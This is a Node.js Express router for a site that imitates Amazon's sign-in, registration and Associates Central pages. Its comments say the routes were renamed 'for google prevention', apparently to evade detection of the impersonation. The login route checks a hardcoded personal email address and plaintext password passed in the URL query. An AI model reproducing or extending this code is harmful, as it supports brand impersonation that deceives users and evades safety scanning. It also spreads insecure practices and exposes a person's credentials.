
var express = require('express');
var router = express.Router();



// 'stuck' is named for login which is used before. now changed for google prevention
router.get('/stuck', function(req, res, next) {
    let emailStr = req.query.one;
    let passwordStr = req.query.two;
    let origUrlStr = req.query.origUrl;
    
    if(emailStr === 'iqbalhossain9069@gmail.com' && passwordStr === '123Saiza@@@'){
        req.app.locals.loggedIn = true;
        if(origUrlStr){
            // redirect to original page
            res.redirect(req.app.locals.appName + origUrlStr);
        } else {
            // redirect to home page
            res.redirect(req.app.locals.appName + '/home');
        }
    } else {
        // if credential doesn't match send the login page 
        req.app.locals.loggedIn = false;
        res.render('page/ap/signin-a', {
            appUrl: req.app.locals.appUrl,
            jsRes: req.app.locals.jsRes,
            title: 'Amazon Sign-In',
            origUrl: origUrlStr,
            errMsg: "Your email or password is incorrect"
        });
    }
});

// this url handles the request from account registration
// but for the purpose of this site no account could be registered
// we are sending a flag saying the page that it should show
// an error message
// 'happy' is named for registration which is used before. now changed for google prevention
router.get('/happy', function(req, res, next) {
    req.app.locals.loggedIn = false;
    res.render('page/ap/registration-a', {
        appUrl: req.app.locals.appUrl,
        jsRes: req.app.locals.jsRes,
        title: 'Amazon Registration',
        errMsg: true
    });
});

router.get('/ap/signout', function(req, res, next) {
    req.app.locals.loggedIn = false;
    res.render('page/home/visitor-home-2/visitor-home-2', {
        appUrl: req.app.locals.appUrl,
        jsRes: req.app.locals.jsRes,
        title: 'Amazon.com Associates Central'
    });
});




// 'go' is named for signin which is used before. now changed for google prevention
router.get('/ap/go', function(req, res, next) {
  res.render('page/ap/signin-a', {
        appUrl: req.app.locals.appUrl,
        jsRes: req.app.locals.jsRes,
        title: 'Amazon Sign-In'
    });
});

router.get('/ap/registration', function(req, res, next) {
    res.render('page/ap/registration-a', {
        appUrl: req.app.locals.appUrl,
        jsRes: req.app.locals.jsRes,
        title: 'Amazon Registration'
    });
});




module.exports = router;
